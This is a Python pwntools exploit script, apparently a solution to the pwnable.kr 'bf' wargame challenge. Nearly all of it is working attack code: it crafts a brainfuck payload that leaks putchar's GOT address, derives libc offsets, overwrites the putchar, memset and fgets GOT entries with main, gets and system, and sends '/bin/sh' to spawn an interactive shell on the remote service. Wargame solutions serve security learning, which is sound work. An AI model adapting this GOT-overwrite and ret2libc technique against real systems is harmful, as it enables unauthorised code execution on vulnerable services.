#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from math import *
import sys
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

def debug(addr = "0x08048648"):
    raw_input("debug:")
    gdb.attach(io, "b *" + str(addr))

if sys.argv[1][0] == "r":
    io = remote("pwnable.kr", 9001)
    elf = ELF("./bf")
    libc = ELF("./bf_libc.so")
else:
    io = process("./bf")
    elf = ELF("./bf")
    libc = ELF("/lib/i386-linux-gnu/libc-2.24.so")

main_addr = elf.symbols["main"]
base_addr = 0x0804A0A0

def backward(st, ed):
    return "<" * abs(st - ed)

def hijack(target, bullet):
    return ",>" * 4

def leak(para):
    return ".>" * 4

def main():
    #leak putchar
    payload = backward(base_addr, elf.got["putchar"])
    payload += "."#lazy binding
    payload += leak("putchar")
    payload += backward(0, 4)
    #hijack putchar_got to main
    payload += hijack("putchar_got", "main")
    payload += backward(0, 4)
    #hijack memset_got to gets
    payload += backward(elf.got["putchar"], elf.got["memset"])
    payload += hijack("memset_got", "gets")
    payload += backward(0, 4)
    #hijack fgets_got to system
    payload += backward(elf.got["memset"], elf.got["fgets"])
    payload += hijack("fgets_got", "system")
    #ret to main
    payload += "."

    #  with open("payload", "w") as f:
        #  f.write(payload)
    #  debug()
    io.sendlineafter("instructions except [ ]\n", payload)

    io.recv(1)
    putchar_leaked = u32(io.recv(4))
    gets_addr = libc.symbols["gets"] + putchar_leaked - libc.symbols["putchar"]
    success("gets_addr -> 0x%x" % gets_addr)
    system_addr = libc.symbols["system"] + putchar_leaked - libc.symbols["putchar"]
    success("system_addr -> 0x%x" % system_addr)

    io.send(p32(main_addr))
    io.send(p32(gets_addr))
    io.send(p32(system_addr))
    io.sendline("/bin/sh\0")

    io.interactive()

if __name__ == "__main__":
    main()
    io.close()

